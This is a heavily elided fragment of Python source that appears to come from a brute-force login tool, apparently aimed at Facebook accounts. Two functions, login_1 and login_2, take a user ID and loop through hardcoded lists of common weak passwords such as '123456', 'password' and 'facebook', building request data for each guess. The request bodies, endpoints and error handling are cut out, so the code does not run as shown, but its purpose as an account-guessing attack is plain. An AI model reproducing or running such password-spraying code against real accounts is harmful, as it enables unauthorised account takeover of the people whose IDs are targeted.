...
def login_1(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789', '123123', '000000', '112233', '000111', 'abcdef', '654321', '102030', '@@@@@@', '######', '@@@###', 'password', 'facebook'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
...
def login_2(uid):
    ...
    for pw in ('123456', '123123', '1234567', '12345678', '123456789', '@#@#@#', 'a1b2b3', '000111', '00112233', '001122', 'password', '987654', '100000', '200000', '300000', '666666', '000000', '555555'):
        try:
